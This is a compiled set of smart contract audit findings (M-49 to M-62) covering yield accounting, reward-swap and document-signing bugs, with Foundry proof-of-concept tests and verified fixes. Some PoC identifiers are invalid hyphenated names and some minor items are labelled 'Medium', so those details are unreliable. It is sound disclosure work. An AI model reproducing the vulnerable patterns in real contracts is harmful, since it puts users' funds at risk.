```solidity
YieldProviderStorage storage $$ = _getYieldProviderStorage(_yieldProvider);
// @audit `$$.lstLiabilityPrincipal` used without being sync'd
if ($$.lstLiabilityPrincipal + _amount > $$.userFunds) {
  revert LSTWithdrawalExceedsYieldProviderFunds();
}
```

At this point `$$.lstLiabilityPrincipal` may no longer be accurate depending on whether positive or negative rebasing occurred.

**Impact:** In the positive rebasing scenario, Lido's system wouldn't allow overminting `stETH` - it's capped by the deposited ETH on the vault and the collateralization parameter. Hence there is no impact in this case. But in the negative rebasing case a temporary DoS can occur:
```
State: lstLiabilityPrincipal = 100 ETH (stale)
Reality: Dashboard.liabilityShares worth 90 ETH (-10% slashing)
Request: withdrawLST(50 ETH) with userFunds = 140 ETH

Stale Check: 100 + 50 = 150 > 140 ✗ REVERTS
Real Check: 90 + 50 = 140 ≤ 140 ✓ Should pass

Result: LST withdrawal blocked during reserve deficit
```

The temporary DoS would resolve itself the next time an operation occurred that triggered the sync.

**Recommended Mitigation:** Sync `$$.lstLiabilityPrincipal` prior to usage in `YieldManager::withdrawLST` similar to what happens everywhere else it is used.

**Linea:** Fixed in commits [2b99f9bf](https://github.com/Consensys/linea-monorepo/pull/1703/commits/2b99f9bf08aaecf0c28cb399064b821f42340e32) &&  [5cbe6b5](https://github.com/Consensys/linea-monorepo/pull/1703/commits/5cbe6b5e71d9425f2c22f4ea9e33fc85c71936cd), which belongs to [PR 1703](https://github.com/Consensys/linea-monorepo/pull/1703/).

**Cyfrin:** Verified. The [`userFunds` semantics change PR](https://github.com/Consensys/linea-monorepo/pull/1703), removes the need to sync `$$.lstLiabilityPrincipal` in `YieldManager::withdrawLST`. It is no longer used for a check.

## [M-49] Consistently use `ErrorUtils::revertIfZeroAddress`
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** Some parts of the code (eg `YieldProverBase::constructor`) use `ErrorUtils::revertIfZeroAddress` to verify that an input address is not the zero address. But other parts of the code don't do this, re-implementing the check. Use `ErrorUtils::revertIfZeroAddress` consistently in these other places:
* `LineaRollup::initialize, reinitializeLineaRollupV7` - yield manager checks
* `YieldManager::initialize` - `defaultAdmin` check

**Linea:** Fixed in commit [b4b8ef5](https://github.com/Consensys/linea-monorepo/commit/b4b8ef57cbb870d9601a3a6e1d5b725be91de8c8).

**Cyfrin:** Verified.

## [M-50] External LST liability settlements are lost to the protocol when ossification and yield provider removal precedes yield reporting
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** When an external actor settles LST liabilities this creates a windfall (vault has more ETH than `userFunds` reflects) which the protocol's accounting does not immediately reflect. Next time `YieldManager::reportYield` is called the windfall from the external LST liability settlement is recognized by the protocol and reported as yield to be distributed on L2.

However this external windfall is lost to the protocol if `YieldManager::reportYield` is not called and:
1) ossification is initiated and completed
2) `YieldManager::withdrawFromYieldProvider` is called followed by `YieldManager::removeYieldProvider`:
* `withdrawFromYieldProvider` correctly syncs `lstLiabilityPrincipal` to detect the external settlement but does NOT capture the windfall in `userFunds`
* `YieldManager::removeYieldProvider` only checks that `userFunds == 0` before allowing removal and transferring vault ownership. However, it does NOT verify that the vault's actual balance matches `userFunds`

**Impact:** Permanent loss to the protocol of "windfall" protocol assets that could have been distributed to L2 users as:
* the protocol's internal accounting (`userFunds` and `userFundsInYieldProvidersTotal`) becomes permanently disconnected from physical reality (`vaultBalance`), with no mechanism to reconcile the discrepancy
* vault ownership is transferred to a new owner

**Recommended Mitigation:** 1) `YieldManager::removeYieldProvider` should additionally check the vault's actual value and revert if it is not zero:
```solidity
    uint256 actualVaultValue;
    if ($$.isOssified) {
        actualVaultValue = IStakingVault($$.ossifiedEntrypoint).availableBalance();
    } else {
        actualVaultValue = IDashboard($$.primaryEntrypoint).totalValue();
    }

    if (actualVaultValue > 0) {
        revert VaultHasUnreportedValue(actualVaultValue);
    }
```

2) Currently `YieldManager::initiateOssification` calls `LidoStVaultYieldProvider::initiateOssification` which calls `_payMaximumPossibleLSTLiability`. When an external actor has settled the LST liability, `dashboard.liabilitityShares()` will return 0 so the `if` branch will never be entered:
```solidity
  function _payMaximumPossibleLSTLiability(
    YieldProviderStorage storage $$
  ) internal returns (uint256 liabilityPaidETH) {
    if ($$.isOssified) return 0;
    IDashboard dashboard = IDashboard($$.primaryEntrypoint);
    address vault = $$.ossifiedEntrypoint;
    uint256 rebalanceShares = Math256.min(
      dashboard.liabilityShares(), // @audit returns 0 when LST liability externally settled
      STETH.getSharesByPooledEth(IStakingVault(vault).availableBalance())
    );
    if (rebalanceShares > 0) {
      // @audit code never executes when LST liability externally settled
      //
      // Cheaper lookup for before-after compare than availableBalance()
      uint256 vaultBalanceBeforeRebalance = vault.balance;
      dashboard.rebalanceVaultWithShares(rebalanceShares);
      // Apply consistent accounting treatment that LST interest paid first, then LST principal
      _syncExternalLiabilitySettlement($$, dashboard.liabilityShares(), $$.lstLiabilityPrincipal);
      liabilityPaidETH = vaultBalanceBeforeRebalance - vault.balance;
    }
  }
```

One potential fix is to always sync LST liabilities in `LidoStVaultYieldProvider::_payMaximumPossibleLSTLiability`. The current strategy of not syncing if `dashboard.liabilitityShares() == 0` appears incorrect as it doesn't handle the case when LST liabilities are externally settled.

**Linea:** Fixed in commit [f45bdfc](https://github.com/Consensys/linea-monorepo/commit/f45bdfc74a90704f4f6320b1dc6683f2b1517338) by having `_payMaximumPossibleLSTLiability` always call `_syncExternalLiabilitySettlement`.

Regarding the suggestion to have `YieldManager::removeYieldProvider` revert if the actual balance is not zero, this creates a potential DoS vector by sending ETH to the vault so did not implement this.

Additionally added commit [55fe25a](https://github.com/Consensys/linea-monorepo/commit/55fe25aef79d9ec76b0cf8441933045b2bf86ee5) to make `LidoStVaultYieldProvider:exitVendorContracts` revert if there is no vendor exit data.

**Cyfrin:** Verified.

\clearpage

## [M-51] Fast fast by performing input-related checks first
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** If a function call were to revert due to invalid input, there's no point performing other unrelated work before that happens. Fast fast by performing input-related checks first:
* `LineaRollup::initialize, reinitializeLineaRollupV7` - perform the valid yield manager address check before everything else. Consider creating a modifier and adding the modifier to both functions to reduce code duplication

**Linea:** Fixed in commit [b4b8ef5](https://github.com/Consensys/linea-monorepo/commit/b4b8ef57cbb870d9601a3a6e1d5b725be91de8c8).

**Cyfrin:** Verified.

## [M-52] Incorrect yield accounting when `_payNodeOperatorFees` reverts in `LidoStVaultYieldProvider::reportYield`
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** When `LidoStVaultYieldProvider::reportYield` invokes `_payNodeOperatorFees`, a revert in `_payNodeOperatorFees` causes the `nodeOperatorFees` value to effectively be treated as `0`.

Despite this, the parent function `YieldManager::reportYield` continues processing the yield without adjusting for the failed fee payment. As a result, the yield is misreported, and the `userFunds` value becomes **artificially inflated**, since the operator fees are never deducted.

 **Impact:**

If `_payNodeOperatorFees` reverts, `$$.userFunds` will be overstated, leading to inaccurate accounting of user balances and potential overestimation of yield.
Furthermore, this behavior does **not** trigger a revert in situations where insufficient funds exist to pay the operator, allowing inconsistent state updates to persist.

**Recommended Mitigation:** Persist the intended `nodeOperatorFees` value even if `_payNodeOperatorFees` fails, and ensure it is accounted for in subsequent operations (e.g., withdrawals or yield adjustments).

**Linea:** Fixed in commit [0e46ee](https://github.com/Consensys/linea-monorepo/pull/1703/commits/0e46ee6efe6ed79526f2a2ed55c1ca82f7e0e663) which belongs to [PR 1703](https://github.com/Consensys/linea-monorepo/pull/1703/files#diff-c8d16d3a1aee9686a5fec0c0d8b96ea370258f3ecaa6b4faae091ccae151a9c2).

**Cyfrin:** Verified. Positive yield is now reported only when the total value held by the underlying `stVault` exceeds all liabilities, obligations, and fees. Payment of liabilities, obligations and fees is attempted each time `reportYield` is executed.

## [M-53] `Getters::getCollateralSurplus` returns positive values even when `Surplus::processSurplus` is guaranteed to revert
- Severity: `Medium`
- Source report: `parallel3.1.md`

### Detailed Content (from source)
**Description:** The view function `Getters::getCollateralSurplus` computes and returns a positive surplus value for a collateral **even when the global collateral ratio is below the `surplusBufferRatio`**.

However, function `Surplus::processSurplus` **always reverts** in this situation due to the explicit check:
```solidity
  function processSurplus(
    ...
  )
    ...
  {
    ...
    (uint64 collatRatio,,,,) = LibGetters.getCollateralRatio();
@>  if (collatRatio < ts.surplusBufferRatio) revert Undercollateralized();
    emit SurplusProcessed(collateralSurplus, stableSurplus, issuedAmount);
  }
```

This means that whenever the global system is under-buffered (i.e., `collatRatio < surplusBufferRatio`), any call to `Surplus::processSurplus` that was triggered after reading a positive value from `Getters::getCollateralSurplus` will revert.

**Recommended Mitigation:** Consider documenting this behavior: A positive return from `Getters::getCollateralSurplus` **does not** guarantee that `Surplus::processSurplus` will succeed — the global collateral ratio must still be ≥ surplusBufferRatio.

Optionally, consider introducing a custom error (i.e. `SurplusNotProcessable`) in the `Getters::getCollateralSurplus` function for explicit signaling that surplus can't be processed because the system is below the defined `surplusBufferRatio`.

**Parallel:** Fixed in commit [60fec2c](https://github.com/parallel-protocol/parallel-parallelizer/commit/60fec2cba723dc47984d3b8b8e000cb5c86c3073)

**Cyfrin:** Verified. `LibSurpluss::_computeCollateralSurplus` now reverts if `collateralRatio < surplusBufferRatio`.

## [M-54] `RewardHandler` may revert due to receiving less than expected
- Severity: `Medium`
- Source report: `parallel3.1.md`

### Detailed Content (from source)
**Description:** The `sellRewards` function can receive too little of tokens such as USDM and stETH on [RewardHandler.sol:L46-48].

```solidity
    (bool success, bytes memory result) = ODOS_ROUTER.call(payload);
    if (!success) _revertBytes(result);
    amountOut = abi.decode(result, (uint256));
```

For managed funds this will lead to a revert on [RewardHandler.sol:L68]()

```solidity
IERC20(collateral).safeTransfer(LibManager.transferRecipient(collatInfo.managerData.config), amountOut);
```
The `ODOS_ROUTER` is defined as `0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559` in `Constants.sol` and the relevant code for a `swap` is below.

At first it may seems like this fragment of [_swap](https://etherscan.io/address/0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559#code#L978) correctly calculates the `amountOut` based on the balance change in the OdosRouter contract.

```solidity
uint256 balanceBefore = _universalBalance(tokenInfo.outputToken);
...
amountOut = _universalBalance(tokenInfo.outputToken) - balanceBefore;
```

Later in that same function on [L1005-L1009](https://etherscan.io/address/0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559#code#L1005) we have

```solidity
_universalTransfer(
    tokenInfo.outputToken,
    thisReferralInfo.beneficiary,
    amountOut * thisReferralInfo.referralFee * 8 / (FEE_DENOM * 10)
);
```

and on [L1582-L1589](https://etherscan.io/address/0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559#code#L1582) we have

```solidity
  function _universalTransfer(address token, address to, uint256 amount) private {
    if (token == _ETH) {
      (bool success,) = payable(to).call{value: amount}("");
      require(success, "ETH transfer failed");
    } else {
      IERC20(token).safeTransfer(to, amount);
    }
  }
```

The `safeTransfer` can send 1 - 2 wei less than the `amount` (equal to `amountOut` from above).

**Impact:** DOS of `sellRewards`.

**Proof of Concept:** In tests/units/parallel-protocolRewardHandlerManaged.t.sol  see:
- `test_cyfrin_SellRewards_CanStrandManagedCollateralWhen_AmountOutUnderstatesIncrease`
- `test_cyfrin_SellRewards_RevertWhen_AmountOutOverstatesManagedIncrease`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

import { MockTokenPermit } from "tests/mock/MockTokenPermit.sol";
import { MockManager } from "tests/mock/MockManager.sol";
import { CyfrinMockOdosRouter } from "tests/mock/parallel-protocolMockOdosRouter.sol";

import "contracts/parallelizer/Storage.sol";
import "contracts/utils/Constants.sol";

import "../Fixture.sol";

contract CyfrinRewardHandlerManagedTest is Fixture {
  IERC20 internal tokenA;
  CyfrinMockOdosRouter internal odosMock;
  MockManager internal managerEurA;
  MockManager internal managerEurB;

  function setUp() public override {
    super.setUp();
    tokenA = IERC20(address(new MockTokenPermit("tokenA", "tokenA", 18)));
    odosMock = new CyfrinMockOdosRouter();
    vm.etch(ODOS_ROUTER, address(odosMock).code);

    managerEurA = new MockManager(address(eurA));
    IERC20[] memory subCollaterals = new IERC20[](1);
    subCollaterals[0] = eurA;
    managerEurA.setSubCollaterals(subCollaterals, "");
    ManagerStorage memory managerData =
      ManagerStorage({ subCollaterals: subCollaterals, config: abi.encode(ManagerType.EXTERNAL, abi.encode(address(managerEurA))) });
    vm.prank(governor);
    parallelizer.setCollateralManager(address(eurA), true, managerData);

    // Manage eurB as well so swapMulti can increase multiple collaterals, and the last increased (eurB) is invested.
    managerEurB = new MockManager(address(eurB));
    IERC20[] memory subCollateralsB = new IERC20[](1);
    subCollateralsB[0] = eurB;
    managerEurB.setSubCollaterals(subCollateralsB, "");
    ManagerStorage memory managerDataB =
      ManagerStorage({ subCollaterals: subCollateralsB, config: abi.encode(ManagerType.EXTERNAL, abi.encode(address(managerEurB))) });
    vm.prank(governor);
    parallelizer.setCollateralManager(address(eurB), true, managerDataB);
  }


  /*
   *  When a token like USDM is used the amount actually transferred by a call to ODOS_ROUTER.swap
   *  can be less than the `amountOut` returned.
   *
   *  This causes a revert in RewardHandler::sellRewards#L68
   */
  function test_cyfrin_SellRewards_RevertWhen_AmountOutOverstatesManagedIncrease() public {
    uint256 amountIn = 100e18;
    uint256 amountOutTransferred = 50e6;
    uint256 amountOutReturned = 100e6;
    bytes memory payload = abi.encodeWithSelector(
      parallel-protocolMockOdosRouter.swapSkewed.selector,
      amountIn,
      amountOutTransferred,
      amountOutReturned,
      address(tokenA),
      address(eurA)
    );

    vm.startPrank(governor);
    deal(address(tokenA), address(parallelizer), amountIn);
    deal(address(eurA), ODOS_ROUTER, amountOutTransferred);
    parallelizer.changeAllowance(tokenA, ODOS_ROUTER, amountIn);
    vm.expectRevert();
    parallelizer.sellRewards(0, payload);
    vm.stopPrank();
  }

  function test_cyfrin_SellRewards_CanStrandManagedCollateralWhen_AmountOutUnderstatesIncrease() public {
    uint256 amountIn = 100e18;
    uint256 amountOutTransferred = 100e6;
    uint256 amountOutReturned = 40e6;
    bytes memory payload = abi.encodeWithSelector(
      parallel-protocolMockOdosRouter.swapSkewed.selector,
      amountIn,
      amountOutTransferred,
      amountOutReturned,
      address(tokenA),
      address(eurA)
    );

    vm.startPrank(governor);
    deal(address(tokenA), address(parallelizer), amountIn);
    deal(address(eurA), ODOS_ROUTER, amountOutTransferred);
    parallelizer.changeAllowance(tokenA, ODOS_ROUTER, amountIn);
    parallelizer.sellRewards(0, payload);
    vm.stopPrank();

    assertEq(eurA.balanceOf(address(parallelizer)), amountOutTransferred - amountOutReturned);
  }

  /*
   *  This test demonstrates that it is possible to call `swapMulti` using `RewardsHandler::sellRewards`
   *
   *  This method returns at uint256[] (not a uint256) but will happily be decoded by abi.decode to
   *  the value 0x20 == 32. (This is the offset value for the array in the return data)
   *
   *  This results in only 32 wei of the token being returned to a managed fund, the rest being
   *  stranded in the RewardHandler contract.
   */
  function test_cyfrin_SellRewards_SwapMulti_ReturnsUintArray_DecodesTo32_StrandsCollateral() public {
    uint256 amountIn = 100e18;

    // We'll increase multiple collaterals (eurA then eurB). RewardHandler will pick the last increased collateral
    // in the collateral list for managed investing logic.
    uint256 eurAOut = 1_000_000; // 1e6 (eurA has 6 decimals)
    uint256 eurBOut = 2_000_000_000_000; // 2e12 (eurB has 12 decimals)

    parallel-protocolMockOdosRouter.inputTokenInfo[] memory inputs = new parallel-protocolMockOdosRouter.inputTokenInfo[](1);
    inputs[0] = parallel-protocolMockOdosRouter.inputTokenInfo({ tokenAddress: address(tokenA), amountIn: amountIn, receiver: ODOS_ROUTER });

    parallel-protocolMockOdosRouter.outputTokenInfo[] memory outputs = new parallel-protocolMockOdosRouter.outputTokenInfo[](2);
    outputs[0] = parallel-protocolMockOdosRouter.outputTokenInfo({ tokenAddress: address(eurA), relativeValue: 0, receiver: address(parallelizer) });
    outputs[1] = parallel-protocolMockOdosRouter.outputTokenInfo({ tokenAddress: address(eurB), relativeValue: 0, receiver: address(parallelizer) });

    // Fund the ODOS router with the output tokens so it can transfer them to the diamond.
    deal(address(eurA), ODOS_ROUTER, eurAOut);
    deal(address(eurB), ODOS_ROUTER, eurBOut);

    bytes memory payload = abi.encodeWithSelector(
      parallel-protocolMockOdosRouter.swapMulti.selector,
      inputs,
      outputs,
      uint256(1),
      bytes(""),
      address(0),
      uint32(0)
    );

    vm.startPrank(governor);
    deal(address(tokenA), address(parallelizer), amountIn);
    parallelizer.changeAllowance(tokenA, ODOS_ROUTER, amountIn);
    parallelizer.sellRewards(0, payload);
    vm.stopPrank();

    // swapMulti returns a `uint256[]` so RewardHandler's `abi.decode(result,(uint256))` reads the first word,
    // which is the offset (0x20), i.e. 32. It will then transfer/invest only 32 units of the chosen managed
    // collateral (eurB), leaving the rest stranded on the diamond.
    assertEq(eurB.balanceOf(address(managerEurB)), 32);
    assertEq(eurB.balanceOf(address(parallelizer)), eurBOut - 32);

    // eurA was also received by the diamond, but because the last increased collateral was eurB, eurA isn't invested.
    assertEq(eurA.balanceOf(address(managerEurA)), 0);
    assertEq(eurA.balanceOf(address(parallelizer)), eurAOut);
  }
}
```

**Recommended Mitigation:** Use the actual amount of tokens received by comparing balance before and after.

```diff
+    uint256 collateralIncrease;
     for (uint256 i; i < listLength; ++i) {
       uint256 newBalance = IERC20(list[i]).balanceOf(address(this));
       if (newBalance < balances[i]) {
@@ -59,14 +60,15 @@ contract RewardHandler is IRewardHandler, AccessManagedModifiers {
       } else if (newBalance > balances[i]) {
         hasIncreased = true;
         collateral = list[i];
-        emit RewardsSoldFor(list[i], newBalance - balances[i]);
+        collateralIncrease = newBalance - balances[i];
+        emit RewardsSoldFor(list[i], collateralIncrease);
       }
     }
     if (!hasIncreased) revert InvalidSwap();
     Collateral storage collatInfo = s.transmuterStorage().collaterals[collateral];
     if (collatInfo.isManaged > 0) {
-      IERC20(collateral).safeTransfer(LibManager.transferRecipient(collatInfo.managerData.config), amountOut);
-      LibManager.invest(amountOut, collatInfo.managerData.config);
+      IERC20(collateral).safeTransfer(LibManager.transferRecipient(collatInfo.managerData.config), collateralIncrease);
+      LibManager.invest(collateralIncrease, collatInfo.managerData.config);
     }
   }
```

**Parallel:** Fixed in commit [fd74080](https://github.com/parallel-protocol/parallel-parallelizer/commit/fd7408093d3e64411452d6e7ac604e6dedfb8eba).

**Cyfrin:** Verified. `amountOut` is now calculated from the actual balance instead of relying on the returned data from the Router.

## [M-55] `DocumentManager::hasSignedDocs` incorrectly returns `true` when there are no documents to sign
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `DocumentManager::hasSignedDocs` incorrectly returns `true` when there are no documents to sign:
```solidity
function hasSignedDocs(address signer) public view returns (bool, bytes32) {
    DocumentStorage storage $ = _getDocumentStorage();
    uint256 numDocs = $._docHashes.length;

    // @audit when numDocs = 0, the `for` loop is bypassed
    // skipping to the `return (true, 0x0);` statement
    for (uint256 i = 0; i < numDocs; ++i) {
        bytes32 docHash = $._docHashes[i];
        if (
            $._documents[docHash].needSignature &&
            $._signatureRecords[signer][docHash] == 0
        ) return (false, docHash);
    }

    return (true, 0x0);
}
```

**Impact:** Upstream contracts incorrectly assume users have signed docs and allow user actions which should be prohibited.

**Proof Of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {DocumentManager} from "../../../contracts/RWAToken/DocumentManager.sol";

import {UnitTestBase} from "../UnitTestBase.sol";

contract DocumentManagerTest is UnitTestBase, DocumentManager {
    function setUp() public override {
        UnitTestBase.setUp();
        initialize();
    }

    function initialize() public initializer {
        __RemoraDocuments_init("NAME", "VERSION");
    }

    // this is incorrect and should be changed once bug is fixed
    function test_hasSignedDocs_TrueWhenNoDocs() external {
        // verify no docs
        assertEq(_getDocumentStorage()._docHashes.length, 0);

        // hasSignedDocs returns true even though no docs to sign
        (bool hasSigned, ) = hasSignedDocs(address(0x1337));
        assertTrue(hasSigned);
    }
}
```

**Recommended Mitigation:** When no docs exist, it is impossible for users to have signed them. Hence in this case `DocumentManager::hasSignedDocs` should either revert with a specific error such as `EmptyDocument` or `return (false, 0x0)`.

**Remora:** Fixed in commit [7454e55](https://github.com/remora-projects/remora-smart-contracts/commit/7454e55e4017aab9d286637fbe5ccf3c705324ba).

**Cyfrin:** Verified.

## [M-56] Don't add duplicate `documentHash` to `DocumentManager::DocumentStorage::_docHashes` when overwriting via `_setDocument` as this causes panic revert when calling `_removeDocument`
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `DocumentManager::_setDocument` intentionally allows overwriting but when overwriting it adds an additional duplicate `documentHash` to `_docHashes`:
```solidity
function _setDocument(
    bytes32 documentName,
    string calldata uri,
    bytes32 documentHash,
    bool needSignature
) internal {
    DocumentStorage storage $ = _getDocumentStorage();
    $._documents[documentHash] = DocData({
        needSignature: needSignature,
        docURI: uri,
        docName: documentName,
        timestamp: SafeCast.toUint32(block.timestamp)
    });

    // @audit duplicate if overwriting
    $._docHashes.push(documentHash);
    emit DocumentUpdated(documentName, uri, documentHash);
}
```

**Impact:** Once the hash has been duplicated in `_docHashes`, it is impossible to remove the document by calling `_removeDocument` as it panic reverts.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {DocumentManager} from "../../../contracts/RWAToken/DocumentManager.sol";

import {UnitTestBase} from "../UnitTestBase.sol";

contract DocumentManagerTest is UnitTestBase, DocumentManager {
    function setUp() public override {
        UnitTestBase.setUp();
        initialize();
    }

    function initialize() public initializer {
        __RemoraDocuments_init("NAME", "VERSION");
    }

    // this is incorrect and should be changed once bug is fixed
    function test_setDocumentOverwrite(string calldata uri) external {
        bytes32 docName = "0x01234";
        bytes32 docHash = "0x5555";
        bool needSignature = true;

        // add the document
        _setDocument(docName, uri, docHash, needSignature);

        // verify its hash has been added to `_docHashes`
        DocumentStorage storage $ = _getDocumentStorage();
        assertEq($._docHashes.length, 1);
        assertEq($._docHashes[0], docHash);

        // ovewrite it
        _setDocument(docName, uri, docHash, needSignature);
        // this duplicates the hash in `_docHashes`
        assertEq($._docHashes.length, 2);
        assertEq($._docHashes[0], docHash);
        assertEq($._docHashes[1], docHash);

        // now attempt to remove it, reverts with
        // panic: array out-of-bounds access
        _removeDocument(docHash);
    }
}
```

**Recommended Mitigation:** In `DocumentManager::_setDocument` check if the `documentHash` already exists and if so, don't add it to `_docHashes`.

Alternatively use [`EnumerableSet`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol) for `DocumentManager::DocumentStorage::_docHashes` which doesn't allow duplicates.

In `_removeDocument` break out of the loop once the element has been deleted:
```diff
        uint256 dHLen = $._docHashes.length;
        for (uint i = 0; i < dHLen; ++i) {
            if ($._docHashes[i] == documentHash) {
                $._docHashes[i] = $._docHashes[dHLen - 1];
                $._docHashes.pop();
+               break;
            }
        }
```

**Remora:** Fixed in commit [1218d18](https://github.com/remora-projects/remora-smart-contracts/commit/1218d1818e1748cd7d9b71e84485f8059d135ab5).

**Cyfrin:** Verified.

## [M-57] Fail fast without performing unnecessary storage reads
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Fail fast without performing unnecessary storage reads:

* `Allowlist::exchangeAllowed` - don't read `_allowed[to]` from storage if the transaction will fail since `from` is not allowed:
```solidity
    function exchangeAllowed(
        address from,
        address to
    ) external view returns (bool) {
        HolderInfo memory fromUser = _allowed[from];
        if (from != address(0) && !fromUser.allowed) revert UserNotRegistered(from);

        HolderInfo memory toUser = _allowed[to];
        if (to != address(0) && !toUser.allowed) revert UserNotRegistered(to);

        return fromUser.domestic == toUser.domestic; //logic to be edited later on
    }
```

* `Allowlist::hasTradeRestriction` - don't read `_allowed[user2]` from storage if the transaction will fail since `_allowed[user1]` is not allowed:
```solidity
    function hasTradeRestriction(
        address user1,
        address user2
    ) public returns (bool) {
        HolderInfo memory u1Data = _allowed[user1];
        if (!u1Data.allowed) revert UserNotRegistered(user1);

        HolderInfo memory u2Data = _allowed[user2];
        if (!u2Data.allowed) revert UserNotRegistered(user2);
```

**Remora:** Fixed in commits [81faadb](https://github.com/remora-projects/remora-smart-contracts/commit/81faadbd3baa1deec950db08abf635c5a277a7c5), [760469f](https://github.com/remora-projects/remora-smart-contracts/commit/760469fb5a0263ab5527d7c35e7887349f1a2368).

**Cyfrin:** Verified.

## [M-58] Impossible to remove a document added with zero uri length
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Impossible to remove a document added with zero uri length.

**Proof of Concept:** After fixing the bug "Don't add duplicate documentHash to DocumentManager::DocumentStorage::_docHashes when overwriting via _setDocument as this causes panic revert when calling _removeDocument", run this fuzz test:
```solidity
    function test_setDocumentOverwrite(string calldata uri) external {
        bytes32 docName = "0x01234";
        bytes32 docHash = "0x5555";
        bool needSignature = true;

        // add the document
        _setDocument(docName, uri, docHash, needSignature);

        // verify its hash has been added to `_docHashes`
        DocumentStorage storage $ = _getDocumentStorage();
        assertEq($._docHashes.length, 1);
        assertEq($._docHashes[0], docHash);

        // ovewrite it
        _setDocument(docName, uri, docHash, needSignature);
        // verify overwriting doesn't duplicate the hash in `_docHashes`
        assertEq($._docHashes.length, 1);
        assertEq($._docHashes[0], docHash);

        // now attempt to remove it
        _removeDocument(docHash);
    }
```

It reverts with `[FAIL: EmptyDocument();` when calling `_removeDocument` at the end.

**Recommended Mitigation:** Don't allowing adding documents with empty uri.

**Remora:** Fixed in commit [1218d18](https://github.com/remora-projects/remora-smart-contracts/commit/1218d1818e1748cd7d9b71e84485f8059d135ab5).

**Cyfrin:** Verified.

## [M-59] Tokens that were locked when `lockUpTime > 0` will be impossible to unlock if `lockUpTime` is set to zero
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `LockUpManager::_unlockTokens` returns if `lockUpTime == 0`:
```solidity
function _unlockTokens(
    address holder,
    uint256 amount,
    bool disregardTime
) internal {
    LockUpStorage storage $ = _getLockUpStorage();
    uint32 lockUpTime = $._lockUpTime;
    // @audit returns if `lockUpTime == 0`
    if (lockUpTime == 0 || amount == 0) return;
```

**Impact:** Tokens that were locked when `lockUpTime > 0` will be impossible to unlock if `lockUpTime` is subsequently set to zero. Initially this won't cause any problems and users will be able to transfer tokens as normal, but if `lockUpTime` is changed to be greater than zero it will start to cause accounting-related problems as one of the protocol invariants is that the amount of tokens a user has locked should be <= to the token balance of the user.

This invariant would be violated since the lockups would still be present but the user could have transferred their tokens, causing underflow reverts in transfers when determine unlocked balance: `uint256 unlockedBalanceToSend = balance - getTokensLocked(sender);`

**Recommended Mitigation:** Even if `lockUpTime == 0`, proceed through to the `for` loop iterating over all token locks to unlock them. This maintains the  protocol invariant that the amount of tokens a user has locked is <= the user's token balance.

**Remora:** Fixed in commit [5db7f11](https://github.com/remora-projects/remora-smart-contracts/commit/5db7f11427f6e767a6042c443d552ee9c024494b).

**Cyfrin:** Verified.

## [M-60] Use `SignatureChecker` library and optionally support `EIP7702` accounts which use their private key to sign
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** In `DocumentManager::verifySignature` use the [SignatureChecker](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/SignatureChecker.sol) library:
```diff
-        if (signer.code.length == 0) {
-            //signer is EOA
-            (address returnedSigner, , ) = ECDSA.tryRecover(digest, signature);
-            result = returnedSigner == signer;
-        } else {
-            //signer is SCA
-            (bool success, bytes memory ret) = signer.staticcall(
-                abi.encodeWithSelector(
-                    bytes4(keccak256("isValidSignature(bytes32,bytes)")),
-                    digest,
-                    signature
-                )
-            );
-            result = (success && ret.length == 32 && bytes4(ret) == MAGICVALUE);
-        }

-        if (!result) revert InvalidSignature();
+        if(!SignatureChecker.isValidSignatureNow(signer, digest, signature)) revert InvalidSignature();
```

Additionally with [EIP7702](https://eip7702.io/), it is now possible for addresses to have `code.length > 0` but still use their private keys to sign; so with the current code or the above recommendation this scenario won't be supported.

To support this scenario check out [this finding](https://solodit.remora-projects.io/issues/verifysignature-is-not-compatible-with-smart-contract-wallets-or-other-smart-accounts-remora-projects-none-evo-soulboundtoken-markdown) from our recent audit where this scenario is also supported by first calling [ECDSA.tryRecover](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L56) then if that didn't work calling `SignatureChecker::isValidERC1271SignatureNow` as the backup option:
```diff
+        (address recovered, ECDSA.RecoverError error,) = ECDSA.tryRecover(digest, signature);
​
+        if (error == ECDSA.RecoverError.NoError && recovered == signer) result = true;
+        else result = SignatureChecker.isValidERC1271SignatureNow(signer, digest, signature);

+        if (!result) revert InvalidSignature();
```

**Remora:** Fixed in commit [b545498](https://github.com/remora-projects/remora-smart-contracts/commit/b545498ed931eb63ae0ec7f6fb3297ce25886281).

**Cyfrin:** Verified.

## [M-61] Use timestamp instead of uri length to test of existing document in `DocumentManager`
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Use timestamp instead of uri length to test of existing document in `DocumentManager`:
```diff
-       if (bytes($._documents[docHash].docURI).length == 0)
-           revert EmptyDocument();
+       if ($._documents[docHash].timestamp == 0) revert EmptyDocument();
```

**Remora:** Fixed in commit [77af634](https://github.com/remora-projects/remora-smart-contracts/commit/77af634d953ce3549a33e7b34db924233dc7689a).

**Cyfrin:** Verified.

\clearpage

## [M-62] Consider removing redundant zero address check from `createYieldStrategy`
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
